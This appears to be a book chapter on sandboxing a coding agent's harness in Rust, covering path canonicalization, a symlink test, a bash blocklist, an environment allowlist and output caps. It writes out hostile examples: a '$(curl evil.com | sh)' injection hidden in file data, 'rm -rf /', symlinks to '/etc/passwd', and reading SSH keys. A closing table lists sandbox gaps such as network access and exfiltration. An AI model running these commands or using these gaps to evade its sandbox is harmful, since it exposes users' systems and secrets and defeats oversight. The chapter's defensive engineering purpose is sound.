# Chapter 5: Sandboxing — The Agent's Safety Rails

> "In theory there is no difference between theory and practice. In practice there is." — *Yogi Berra*

## Introduction

A coding agent with file edit and shell execution capabilities is, from the OS perspective, a very chatty user with an extremely fast keyboard. If the model decides to execute `rm -rf /`, nothing in the LLM API will stop it. The only meaningful defense is the harness code you write.

This chapter covers that critical code. The central file is `src/tool_runners.rs`.

## 5.1 The Comprehensive Threat Model

Three classes of potential failure or attack:

### Class 1: Honest Mistakes (Most Common)
The model intended to edit `src/main.rs`, became confused about the working directory, and wrote `../../main.rs` or `/etc/passwd`. This is the most common failure and easiest to defend against.

### Class 2: Path-Traversal Exploitation
A repository contains a symlink called `README.md` pointing at `/etc/shadow`. The model reads it and pastes contents into the next tool call.

### Class 3: Command-Injection Exploitation
A file contains `$(curl evil.com | sh)`, the model embeds this into a `bash` command without proper quoting, and a remote attacker gains shell execution. This is the nastiest class because the attack vector is DATA, not INSTRUCTIONS.

## 5.2 The Workdir Root

Every tool runner takes a `WorkdirRoot` parameter:

```rust
#[derive(Clone)]
pub struct WorkdirRoot {
    original: PathBuf,
    canonical: PathBuf,
}

impl WorkdirRoot {
    pub fn new(path: &Path) -> Result<Self, String> {
        let canonical = path.canonicalize()
            .map_err(|e| format!("canonicalize workdir: {e}"))?;
        Ok(Self { original: path.to_path_buf(), canonical })
    }
}
```

Three observations:

1. **Canonical path computed ONCE.** `canonicalize()` resolves symlinks, converts relative to absolute. Computing once means every subsequent security check is a fast string comparison.

2. **BOTH original and canonical stored.** `original` is what the human typed and what appears in logs. `canonical` is what sandbox checks use. Don't collapse them — users hate seeing `~/project` expanded to unreadable paths.

3. **`new` returns `Result`, never `Option`.** If canonicalization fails, the harness must know exactly why to inform the user.

A `WorkdirRoot` is constructed once per session and threaded through every tool call. It grants access to exactly one isolated subtree.

## 5.3 The safe_path Function

Every file operation begins with this function:

```rust
pub fn safe_path(p: &str, workdir_root: &WorkdirRoot) -> Result<PathBuf, String> {
    let workdir_canon = workdir_root.as_canonical();
    let workdir = workdir_root.as_path();
    let joined = workdir.join(p);
    let resolved = canonicalize_partial(&joined)?;
    if !resolved.starts_with(workdir_canon) {
        return Err(format!("path escapes sandbox: {p}"));
    }
    Ok(resolved)
}
```

Four steps:

1. **Join the user path** — if model passes `src/main.rs` and workdir is `/home/jane/project`, joined becomes `/home/jane/project/src/main.rs`. If user passes an ABSOLUTE path like `/etc/passwd`, `join` throws away the base directory.

2. **Canonicalize** — `canonicalize_partial` resolves all `.` and `..` components, follows symlinks, returns absolute path. Handles paths to files that don't yet exist.

3. **Check the prefix** — `resolved.starts_with(workdir_canon)` is the fundamental sandbox check. Handles `../../etc/passwd`, absolute paths, and symlink escapes.

4. **Return the resolved path** — the caller uses the canonical path, NOT the original string. This prevents TOCTOU race conditions.

**The Gold Line:** `starts_with` on `PathBuf` is component-wise, NOT byte-wise. `/home/jane/project-evil` does NOT start with `/home/jane/project` as a path prefix. Rust's `Path::starts_with` handles this correctly; Python's `str.startswith` does NOT.

## 5.4 Symlink Traversal

The test suite contains:

```rust
#[test]
#[cfg(unix)]
fn symlink_outside_workdir_is_rejected() {
    let tmp = tempfile::TempDir::new().unwrap();
    let outside = tempfile::TempDir::new().unwrap();
    std::fs::write(outside.path().join("secret"), "x").unwrap();
    let link = tmp.path().join("escape");
    std::os::unix::fs::symlink(outside.path(), &link).unwrap();
    let wr = WorkdirRoot::new(tmp.path()).unwrap();
    let bad = safe_path("escape/secret", &wr);
    assert!(bad.is_err());
}
```

A symlink INSIDE the workdir that points OUTSIDE. The naive check "does string contain `..`?" says NO. `safe_path` REJECTS because `canonicalize_partial` follows the symlink BEFORE the prefix check.

**Mid-session symlink attack:** Model executes `ln -s /etc/passwd foo` then calls `read_file foo`. This attack is caught because `read_file` goes through `safe_path` on EVERY invocation and re-canonicalizes the path fresh every time. Never cache sandbox checks.

## 5.5 The Bash Allowlist

Shell commands cannot be sandboxed through path-checking alone:

```rust
pub fn run_bash(command: &str, workdir: &Path) -> String {
    let blocked = ["rm -rf /", "sudo", "shutdown", "reboot", "> /dev/"];
    if blocked.iter().any(|b| command.contains(b)) {
        return "Error: Dangerous command blocked".to_string();
    }
    let mut cmd = Proc::new("sh");
    cmd.arg("-c").arg(command);
    cmd.current_dir(workdir);
    cmd.env_clear();
    for key in BASH_ENV_ALLOWLIST {
        if let Ok(val) = std::env::var(key) {
            cmd.env(key, val);
        }
    }
}
```

### Defense 1: Substring Blocklist
Best-effort only. Catches the model doing something honestly stupid, NOT a genuine security boundary. Never rely on a blocklist for security.

### Defense 2: Environment Allowlist
`cmd.env_clear()` wipes EVERY environment variable, then adds back ONLY those in `BASH_ENV_ALLOWLIST`:

| Reason | How It Protects |
|--------|----------------|
| Secrets isolated | `ANTHROPIC_API_KEY` in parent environment stays isolated |
| PATH controlled | Model cannot prepend `/tmp/evil` to path |
| Deterministic output | Variables like `LANG`, `TZ` don't affect command output |

Start with an empty allowlist and conservatively add only variables whose absence breaks something.

## 5.6 Output Caps as Essential Sandboxing

```rust
if text.len() > MAX_TOOL_OUTPUT_BYTES {
    text[..MAX_TOOL_OUTPUT_BYTES].to_string()
}
```

`MAX_TOOL_OUTPUT_BYTES` is 50 KB. Every tool output is hard-capped.

**Attack prevented:** Model executes `cat /dev/urandom` and attempts to read megabytes into the context window. Without a cap:

- Context window blows up catastrophically
- API bill doubles
- Log files bloat
- Downstream parsers hang

50 KB represents "approximately ten full screens of text" — sufficient for any useful observation and small enough that the model must be strategic. The cap teaches the model to be economical.

## 5.7 What This System Does NOT Protect Against

| Attack Vector | Why The Harness Can't Help |
|-------------|------------------------|
| Network access | `bash curl evil.com` works fine |
| Forkbombs, CPU hogging | Nothing caps total resource usage |
| Persistent changes inside workdir | Sandbox deliberately keeps writes inside |
| Sensitive data exfiltration | Model reads `~/.ssh/id_rsa`, writes to tool_result, then logs |

Sandboxing handles ONLY: path traversal defense, environment leakage prevention, output bloat management. Other layers (OS-level isolation, network filtering, git-based recovery) are outside the harness scope.

---

**Next:** Chapter 6 — Context Management and Token Budgets